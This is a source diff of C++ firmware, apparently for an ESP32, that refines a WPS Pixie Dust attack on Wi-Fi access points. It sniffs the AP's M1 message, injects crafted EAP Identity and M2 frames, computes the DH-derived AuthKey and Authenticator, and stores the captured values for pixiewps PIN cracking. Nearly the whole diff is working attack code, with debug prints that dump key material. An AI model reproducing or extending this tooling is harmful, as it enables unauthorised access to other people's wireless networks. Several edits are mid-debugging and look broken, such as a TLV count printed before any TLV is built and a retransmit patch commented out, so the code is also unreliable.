@@ -150,6 +150,27 @@ static bool hmacSha256(const uint8_t *key, size_t keyLen,
 }
 
 
+void wps_clean_m1_body(uint8_t *buf, int *len) {
+    if (!buf || *len < 4) return;
+    // Scan for the first TLV that looks like Version (0x104A)
+    int offset = 0;
+    while (offset + 4 <= *len) {
+        uint16_t type = (buf[offset] << 8) | buf[offset+1];
+        if (type == 0x104A) {
+            // Found Version TLV – shift buffer and update length
+            if (offset > 0) {
+                memmove(buf, buf + offset, *len - offset);
+                *len -= offset;
+                Serial.printf("[Pixie] Cleaned M1 body: removed %d leading bytes\n", offset);
+            }
+            return;
+        }
+        offset++;
+    }
+    // Fallback: no valid Version TLV found – keep original (will fail later)
+    Serial.println("[Pixie] WARNING: could not find Version TLV in M1 body");
+}
+
 // ============================================================
 // Derive AuthKey from DH shared secret (WPS KDF, §6.5)
 // AuthKey = KDF(DHKey, "Wi-Fi Easy and Secure Key Derivation",
@@ -968,12 +989,16 @@ static uint8_t *buildM2Frame(const uint8_t *apBssid,
     if (!wpsBody) { *outLen=0; return nullptr; }
     int wp = 0;
 
+    int tlvCount = 0;
     auto putTlv = [&](uint16_t type, const uint8_t *val, uint16_t vlen) {
         if (wp + 4 + vlen > MAX_WPS) return;
         wpsBody[wp++]=(type>>8)&0xFF; wpsBody[wp++]=type&0xFF;
         wpsBody[wp++]=(vlen>>8)&0xFF; wpsBody[wp++]=vlen&0xFF;
         memcpy(wpsBody+wp, val, vlen); wp+=vlen;
+        tlvCount++;
     };
+
+    Serial.printf("[M2] Built %d TLVs, total WPS body length = %d (expected 379)\n", tlvCount, wp);
 
     putTlv(0x104A, version,        sizeof(version));
     putTlv(0x1022, msgType,        sizeof(msgType));
@@ -1000,6 +1025,17 @@ static uint8_t *buildM2Frame(const uint8_t *apBssid,
 
     // Compute Authenticator = HMAC-SHA256(AuthKey, M1_body || M2_body_so_far)[0:8]
     // M2_body_so_far = wpsBody up to (but not including) the Authenticator TLV.
+
+    Serial.printf("[DH] M1 body (%d bytes) start: ", m1WpsLen);
+        for (int i = 0; i < min(32, m1WpsLen); i++) Serial.printf("%02X ", m1WpsBody[i]);
+        Serial.println();
+        Serial.printf("[DH] M2 body (%d bytes) start: ", wp);
+        for (int i = 0; i < min(32, wp); i++) Serial.printf("%02X ", wpsBody[i]);
+        Serial.println();
+        Serial.printf("[DH] AuthKey: ");
+        for (int i = 0; i < 32; i++) Serial.printf("%02X", authKey[i]);
+        Serial.println();
+
     uint8_t computedAuth[8];
     if (authKey && m1WpsBody && m1WpsLen > 0 &&
         computeAuthenticator(authKey, m1WpsBody, m1WpsLen, wpsBody, wp, computedAuth)) {
@@ -1201,10 +1237,7 @@ static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
                     if (!(isTPLink || isStdWfa || isDblWrap || isShell)) return;
 
                     // ── Registrar flow: AP sends M1 (op=WSC_MSG, MsgType=0x04) ──
-                    // Accept M1 in WaitingApM1 OR IdentityRespSent — the AP sometimes
-                    // sends M1 before our state machine advances past IdentityRespSent.
-                    if (opcode == 0x04 && (g_wpsState == WpsProbeState::WaitingApM1 ||
-                                           g_wpsState == WpsProbeState::IdentityRespSent)) {
+                    if (opcode == 0x04 && g_wpsState == WpsProbeState::WaitingApM1) {
                         // Find MsgType TLV inside the WPS payload to confirm M1
                         const uint8_t *tlvBase = p + offset + 5 + tlvOff;
                         int tlvLen = len - (int)(tlvBase - p);
@@ -1218,9 +1251,12 @@ static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
                         }
                         if (msgTypeVal == 0x04) {
                             Serial.printf("[WPS-Probe] AP M1 received (EAP id=0x%02X)\n", eapId);
-                            g_apM1EapId   = eapId;   // ← ADD THIS
+                            // Write ids BEFORE the flag — main thread wakes on g_gotEapIdReq
+                            // and must see the correct EAP id immediately (no stale read).
+                            g_apM1EapId   = eapId;
                             g_lastEapId   = eapId;
                             g_wpsState    = WpsProbeState::WaitingApM3;
+                            __sync_synchronize();  // full memory barrier before flag
                             g_gotEapIdReq = true;
                         }
                     }
@@ -1302,7 +1338,6 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     g_wpsState      = WpsProbeState::Idle;
     g_identityReqId = 0;
     g_lastEapId     = 0;
-    g_apM1EapId     = 0;
     g_gotAuthResp   = false;
     g_gotAssocResp  = false;
     g_gotEapIdReq   = false;
@@ -1408,15 +1443,28 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     }
     vTaskDelay(pdMS_TO_TICKS(50));
 
-    // Proactive Identity Response — id=0, no waiting for EAP-Req/Identity.
-    // In Registrar mode the AP goes straight to sending M1 after Identity.
-    flen = buildEapIdentityResponse(frameBuf, bssid, 0x00);
+    // Identity Response: must echo the AP's EAP-Req/Identity id.
+    // Wait up to 600 ms for the AP to send EAP-Req/Identity; if it arrives
+    // use its id.  Fall back to 0x00 only if nothing comes (very rare).
+    g_wpsState = WpsProbeState::WaitingIdentityReq;
+    {
+        uint32_t deadline = millis() + 600;
+        while (!g_gotEapIdReq && millis() < deadline)
+            vTaskDelay(pdMS_TO_TICKS(10));
+        // g_gotEapIdReq is set by the callback for EAP-Req/Identity at this state
+        // and g_identityReqId holds its EAP id.
+    }
+    uint8_t identId = g_gotEapIdReq ? g_identityReqId : 0x00;
+    g_gotEapIdReq = false;  // reset so we can reuse it for M1 detection below
+
+    Serial.printf("[WPS-Probe] Got EAP-Req/Identity (id=0x%02X), sending Identity resp\n", identId);
+    flen = buildEapIdentityResponse(frameBuf, bssid, identId);
     g_wpsState = WpsProbeState::IdentityRespSent;
-    for (int i = 0; i < 3; i++) {
+    for (int i = 0; i < 2; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
         vTaskDelay(pdMS_TO_TICKS(40));
     }
-    Serial.println("[WPS-Probe] Proactive Identity sent, waiting for AP M1...");
+    Serial.println("[WPS-Probe] Identity sent, waiting for AP M1...");
 
     // ── Step 1: Wait for AP M1 (MsgType=0x04) ──────────────────────────────
     // g_gotEapIdReq is re-purposed: set to true by wpsProbeSnifferCb when AP M1 arrives.
@@ -1424,6 +1472,7 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     {
         uint32_t deadline = millis() + 5000;
         while ((!g_gotEapIdReq || !pixieCapture.pke_set) && millis() < deadline) {
+
             if (check(EscPress)) return false;
             vTaskDelay(pdMS_TO_TICKS(20));
         }
@@ -1431,10 +1480,11 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
             Serial.println("[WPS-Probe] AP M1 timeout");
             return false;
         }
-        vTaskDelay(pdMS_TO_TICKS(20));
+        // Small delay to let sniffer finish writing all M1 fields
+        vTaskDelay(pdMS_TO_TICKS(200));
     }
     // At this point sniffer has captured AP's PKE and E-Nonce from M1.
-    Serial.printf("[WPS-Probe] AP M1 captured. Sending M2 (EAP ID=0x%02X)\n", g_apM1EapId);
+    Serial.printf("[WPS-Probe] AP M1 captured. Sending M2 (EAP ID=0x%02X)\n", g_lastEapId);
     vTaskDelay(pdMS_TO_TICKS(50));
 
     // ── Compute DH shared secret from AP's PKE ───────────────────────────────
@@ -1469,11 +1519,12 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
         Serial.println("[WPS-Probe] DH secret failed — M2 will have zero Authenticator");
     }
 
-    // Extract M1 WPS body from pixieCapture for Authenticator computation.
-    // The sniffer stores the raw TLV bytes in pixieCapture.m1Body[]/m1BodyLen
-    // (we add these fields below). If not available, authenticator will be zero.
+    // Snapshot the EAP id once — g_apM1EapId was set by the sniffer callback
+    // with a memory barrier before g_gotEapIdReq, so this read is safe.
+    uint8_t const apEapId = g_apM1EapId;
+
     int m2Len = 0;
-    uint8_t *m2Frame = buildM2Frame(bssid, g_apM1EapId,
+    uint8_t *m2Frame = buildM2Frame(bssid, apEapId,
                                     pixieCapture.e_nonce,
                                     g_ourPkr,
                                     rNonceLocal, &m2Len,
@@ -1481,7 +1532,6 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
                                     pixieCapture.m1Body,
                                     pixieCapture.m1BodyLen);
     if (!m2Frame) { Serial.println("[WPS-Probe] M2 alloc failed"); return false; }
-
 
     // Save our PKR and R-Nonce into pixieCapture for pixiewps
     memcpy(pixieCapture.pkr,     g_ourPkr,    192);
@@ -1494,9 +1544,11 @@ static bool runActiveProbe(const String &/*tssid*/, uint8_t channel,
     static const int      M2_MAX_RETRY = 3;
 
     bool gotM3 = false;
+
     for (int attempt = 0; attempt <= M2_MAX_RETRY && !gotM3; attempt++) {
-        // Patch EAP ID on retransmit (AP may have re-sent M1 with a new id)
-        m2Frame[39] = g_apM1EapId;
+        // On retransmit: if AP re-sent M1 the callback updated g_apM1EapId.
+        // Patch the frame's EAP id byte to stay in sync.
+     //   m2Frame[39] = g_apM1EapId; Debug no patch
         if (attempt == 0)
             Serial.printf("[WPS-Probe] Sending M2 (EAP ID=0x%02X) t=%lums\n", m2Frame[39], millis());
         else
